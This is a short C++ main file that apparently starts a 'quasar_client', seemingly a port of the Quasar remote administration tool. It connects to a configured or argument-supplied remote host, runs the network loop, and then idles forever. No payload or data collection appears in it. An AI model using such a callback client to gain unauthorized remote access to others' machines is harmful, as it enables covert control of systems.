#include <iostream>
#include "stdafx.h"
#include "quasar_client.h"
#include "helpers.h"

struct HelloWorld {
	void operator()() const {
		std::cout << "Hello, World!" << std::endl;
	}
};

int main(int argc, char *argv[]) {
	boost::asio::io_service io_srvc;

	HelloWorld h;

	quasar::quasar_client c(io_srvc);

	if (argc != 3) {
		c.connect(SETTINGS_REMOTE_HOST, SETTINGS_REMOTE_PORT);
	} else {
		c.connect(argv[1], argv[2]);
	}
	io_srvc.run();

	for (;;) {
#ifdef __WINDOWS__
		Sleep(1000);
#elif __linux__
		sleep(1000);
#endif
	}
	return 0;
}

